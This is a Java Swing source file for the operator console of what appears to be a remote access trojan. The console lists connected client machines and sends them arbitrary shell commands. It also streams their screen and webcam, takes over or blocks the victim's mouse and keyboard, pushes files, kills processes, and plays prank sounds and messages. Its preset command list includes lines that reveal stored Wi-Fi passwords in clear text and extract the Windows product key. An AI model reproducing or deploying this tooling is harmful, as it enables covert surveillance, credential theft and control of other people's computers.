package main;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.MouseMotionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.HashSet;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingConstants;
import javax.swing.Timer;

import interfaces.Command;
import interfaces.ParameterGetter;
import tools.Logger;
import tools.Logger.Level;

public class Controller {

	private Server server;
	private Timer loop;

	private final String NAME = "Controller";

	private JFrame frame;
	private JPanel mainPanel;
	private JPanel consolePanel;
	private JPanel screenPanel;
	private JPanel dataPanel;
	private JPanel settingsPanel;
	private JPanel screenButtonsPanel;
	
	private JTextField commandInput;
	private JTextArea outputArea;
	private JComboBox<String> templatesDropdown;
	private JComboBox<Command> templates2Dropdown;
	private JComboBox<ClientData> clientDropdown;
	private JRadioButton screenshotButton;
	private JRadioButton mouseMovingButton;
	private JLabel upsLabel;
	private JRadioButton blockInputsButton;
	private JRadioButton webcamButton;
	
	private Point screenPanelMousePosition = new Point();
	private Point clientScreenMousePositionPercentage = new Point(50, 50);
	private boolean mouseIsPressed = false;
	private File transferFile = null;
	private BufferedImage webcamImage;
	private BufferedImage clientScreenshot;
	private final KeyConverter keyListener = new KeyConverter();
	
	
	public static void main(String[] args) throws IOException {
		/*String a = Base64.getEncoder().encodeToString(Files.readAllBytes(new File("image.png").toPath()));
		byte[] b = Base64.getDecoder().decode(a);
		String c = new String(b);
		
		System.out.println(a);
		System.out.println(Arrays.toString(b));
		System.out.println(c);
		
		FileOutputStream fos = new FileOutputStream(new File("a.jpg"));
		fos.write(b);
		fos.close();*/
		
		new Controller();
	}

	public Controller() throws IOException {
		server = new Server(this);
		setupFrame();
		server.start();
		loop();
	}

	private void setupFrame() {
		// Frame
		frame = new JFrame();

		frame.setTitle("Controller");
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setResizable(true);
		frame.setSize(900, 650);
		frame.setLocationRelativeTo(null);
		
		frame.setFocusable(true);
		
		frame.addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				server.stop();
			}
		});

		// Panels
		mainPanel = new JPanel();
		mainPanel.setLayout(new GridLayout(1, 2));
		frame.add(mainPanel);

		//
		consolePanel = new JPanel();
		consolePanel.setLayout(new BorderLayout());
		mainPanel.add(consolePanel);

		dataPanel = new JPanel();
		dataPanel.setLayout(new BorderLayout());
		mainPanel.add(dataPanel);

		//
		settingsPanel = new JPanel();
		settingsPanel.setLayout(new GridLayout(6, 2));
		dataPanel.add(settingsPanel, BorderLayout.NORTH);

		screenPanel = new JPanel() {
			private static final long serialVersionUID = 1L;

			@Override
			public void paint(Graphics g) {
				g.setColor(Color.LIGHT_GRAY);
				g.fillRect(0, 0, screenPanel.getWidth(), screenPanel.getHeight());
				
				BufferedImage image = (clientScreenshot != null) ? clientScreenshot : webcamImage;
				
				if (image != null) {
					int width = Math.min(image.getWidth(), screenPanel.getWidth());
					int height = Math.min(image.getHeight(), screenPanel.getHeight());
					if(width != image.getWidth()) {
						height = width * 9 / 16;
					}
					
					int x = (screenPanel.getWidth() - width) / 2;
					int y = (screenPanel.getHeight() - height) / 2;
					
					g.drawImage(image, x, y, width, height, null);
					
					Rectangle bounds = new Rectangle(x, y, width, height);
					if(bounds.contains(screenPanelMousePosition)) {
						Point localPosition = new Point(screenPanelMousePosition.x-x, screenPanelMousePosition.y-y);
						clientScreenMousePositionPercentage = new Point((int) (100d / ((double) width/localPosition.x)), (int) (100d / ((double) height/localPosition.y)));
					}
				}
			}
		};
		screenPanel.addMouseMotionListener(new MouseMotionListener() {
			@Override
			public void mouseMoved(MouseEvent e) {
				screenPanelMousePosition = e.getPoint();
			}
			@Override
			public void mouseDragged(MouseEvent e) {
				mouseMoved(e);
			}
		});
		screenPanel.addKeyListener(keyListener);
		screenPanel.addMouseListener(new MouseListener() {
			@Override
			public void mouseReleased(MouseEvent e) {
				
			}
			@Override
			public void mousePressed(MouseEvent e) {
				if(mouseMovingButton.isSelected()) {
					mouseIsPressed = true;
				}
			}
			@Override
			public void mouseExited(MouseEvent e) {
			}
			@Override
			public void mouseEntered(MouseEvent e) {
			}
			@Override
			public void mouseClicked(MouseEvent e) {
			}
		});
		screenPanel.setLayout(new BorderLayout());
		dataPanel.add(screenPanel, BorderLayout.CENTER);
		
		screenButtonsPanel = new JPanel(new GridLayout(1, 1));
		dataPanel.add(screenButtonsPanel, BorderLayout.SOUTH);

		// Dropdown
		JLabel clientDropdownLabel = new JLabel("Select Client  >>", SwingConstants.CENTER);
		settingsPanel.add(clientDropdownLabel);

		clientDropdown = new JComboBox<ClientData>();
		settingsPanel.add(clientDropdown);
		
		//JLabel templatesDropdownLabel = new JLabel("Command Templates");
		//settingsPanel.add(templatesDropdownLabel);
		
		JButton button = new JButton("SEND CMD");
		button.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				((ClientData) clientDropdown.getSelectedItem()).getTasks().runCommand((String) templatesDropdown.getSelectedItem());
			}
		});
		settingsPanel.add(button);
		
		templatesDropdown = new JComboBox<String>(new String[] {
				"RUNDLL32.EXE user32.dll,SwapMouseButton *", 
				"rundll32 user32.dll,MessageBeep", 
				"netsh wlan disconnect", 
				"netsh wlan show profile name=WLAN key=clear", 
				"netsh wlan show profile", 
				"wmic path softwarelicensingservice get OA3xOriginalProductKey", 
				"systeminfo", 
				"ipconfig", 
				"ipconfig /release", 
				"ipconfig /renew", 
				"rundll32.exe user32.dll, LockWorkStation", 
		});
		settingsPanel.add(templatesDropdown);
		
		JButton button2 = new JButton("SEND CMD");
		button2.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				((ClientData) clientDropdown.getSelectedItem()).getTasks().execute((Command) templates2Dropdown.getSelectedItem());
			}
		});
		settingsPanel.add(button2);
		
		templates2Dropdown = new JComboBox<Command>(new Command[] {
				new Command("pcusage", "true"),
				new Command("stop", "true"),
				new Command("killtasks", "true"), 
				new Command("image", "unicorn"), 
				new Command("listtasks", "true"), 
				new Command("audio", new ParameterGetter() {
					@Override
					public String get() {
						Object[] possibilities = {"laughing1", "laughing2"};
						String s = (String) JOptionPane.showInputDialog(frame, "", NAME, JOptionPane.QUESTION_MESSAGE,
								null, possibilities, null);
						
						if (s != null) {
						    return s;
						}
						return null;
					}
				}), 
				new Command("msgbox", new ParameterGetter() {
					@Override
					public String get() {
						return JOptionPane.showInputDialog(frame, "What would you like to send?");
					}
				}), 
				new Command("killtask", new ParameterGetter() {
					@Override
					public String get() {
						return JOptionPane.showInputDialog(frame, "Which task would you like to kill? (id)");
					}
				}), 
				new Command("say", new ParameterGetter() {
					@Override
					public String get() {
						return JOptionPane.showInputDialog(frame, "What do you want the client to say??");
					}
				}), 
		});
		settingsPanel.add(templates2Dropdown);
		
		JButton fileButton = new JButton("SELECT FILE");
		fileButton.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setCurrentDirectory(Paths.get(".").toFile());
				fileChooser.setDialogType(JFileChooser.OPEN_DIALOG);
				int value = fileChooser.showOpenDialog(frame);
				
				if(value == JFileChooser.APPROVE_OPTION) {
					transferFile = fileChooser.getSelectedFile();
				}
			}
		});
		settingsPanel.add(fileButton);
		
		webcamButton = new JRadioButton("Transmit Webcam");
		settingsPanel.add(webcamButton);
		
		screenshotButton = new JRadioButton("Transmit Screen");
		screenshotButton.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				mouseMovingButton.setEnabled(screenshotButton.isSelected());
				mouseMovingButton.setSelected(false);
			}
		});
		settingsPanel.add(screenshotButton);
		
		mouseMovingButton = new JRadioButton("Control Inputs");
		mouseMovingButton.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				keyListener.reset();
			}
		});
		mouseMovingButton.setEnabled(screenshotButton.isSelected());
		settingsPanel.add(mouseMovingButton);
		
		blockInputsButton = new JRadioButton("Block User Inputs");
		blockInputsButton.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if(blockInputsButton.isSelected()) {
					((ClientData) clientDropdown.getSelectedItem()).getTasks().blockInputs(true);
				}
			}
		});
		settingsPanel.add(blockInputsButton);
		
		upsLabel = new JLabel();
		settingsPanel.add(upsLabel);
		
		JButton windowsButton = new JButton("WINDOWS");
		windowsButton.addActionListener(new ActionListener() {
			@SuppressWarnings("deprecation")
			@Override
			public void actionPerformed(ActionEvent e) {
				keyListener.keyPressed(new KeyEvent(windowsButton, 0, 0, 0, KeyEvent.VK_WINDOWS));
				keyListener.keyReleased(new KeyEvent(windowsButton, 0, 0, 0, KeyEvent.VK_WINDOWS));
			}
		});
		screenButtonsPanel.add(windowsButton);
		
		// Console
		outputArea = new JTextArea();
		outputArea.setLineWrap(true);
		outputArea.setWrapStyleWord(true);

		JScrollPane scrollPane = new JScrollPane(outputArea);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		consolePanel.add(scrollPane, BorderLayout.CENTER);

		// Input for Console
		commandInput = new JTextField();
		commandInput.setFont(new Font("System", Font.BOLD, 32));
		commandInput.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent event) {
				try {
					((ClientData) clientDropdown.getSelectedItem()).getTasks().runCommand(commandInput.getText());
					commandInput.setText("");
				} catch (NullPointerException e) {
					Logger.log("No Client is selected", Level.ERROR);
				}
			}
		});
		consolePanel.add(commandInput, BorderLayout.SOUTH);
		
		frame.setVisible(true);
	}

	private void update() {
		//Update UPS
		if(clientDropdown.getSelectedItem() != null) {
			upsLabel.setText("UPS: " + ((ClientData) clientDropdown.getSelectedItem()).getAverageUPS());
		} else {
			upsLabel.setText("UPS: no client selected");
		}
		
		//
		if(mouseMovingButton.isSelected()) {
			screenPanel.requestFocus();
		}
		
		//Update Console with Log
		if(!outputArea.getText().equals(Logger.getLog())) {
			outputArea.setText(Logger.getLog());
		}
		
		if(!broadcastScreen()) {
			clientScreenshot = null;
		} if(!broadcastWebcam()) {
			webcamImage = null;
		}
		
		//Update Client Dropdown
		ClientData[] oldClients = new ClientData[clientDropdown.getItemCount()];
		for (int i = 0; i < oldClients.length; i++) {
			oldClients[i] = clientDropdown.getItemAt(i);
		}
		if (!compareArrays(oldClients, server.getClients())) {
			clientScreenshot = null;
			screenPanel.repaint();

			clientDropdown.removeAllItems();
			for (ClientData client : server.getClients()) {
				clientDropdown.addItem(client);
			}
		}
	}

	private void loop() {
		loop = new Timer(10, new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				update();
			}
		});
		loop.start();
	}

	private static boolean compareArrays(ClientData[] arr1, ClientData[] arr2) {
		HashSet<ClientData> set1 = new HashSet<ClientData>(Arrays.asList(arr1));
		HashSet<ClientData> set2 = new HashSet<ClientData>(Arrays.asList(arr2));
		return set1.equals(set2);
	}

	public JPanel getScreenPanel() {
		return this.screenPanel;
	}
	public ClientData getSelectedClient() {
		return (ClientData) this.clientDropdown.getSelectedItem();
	}
	public boolean broadcastScreen() {
		return this.screenshotButton.isSelected();
	}
	public boolean controlInputs() {
		return this.mouseMovingButton.isSelected();
	}
	public Point getMousePosition() {
		return this.clientScreenMousePositionPercentage;
	}
	public boolean isMouseClicked() {
		return this.mouseIsPressed;
	}
	public void sentMouseClick() {
		this.mouseIsPressed = false;
	}
	public KeyConverter getKeyListener() {
		return this.keyListener;
	}
	public File getTransferFile() {
		return this.transferFile;
	}
	public void sentFile() {
		this.transferFile = null;
	}
	public String getName() {
		return this.NAME;
	}
	public void setScreenshot(BufferedImage image) {
		this.clientScreenshot = image;
	}
	public void setWebcamImage(BufferedImage image) {
		this.webcamImage = image;
	}
	public boolean broadcastWebcam() {
		return this.webcamButton.isSelected();
	}
	
}
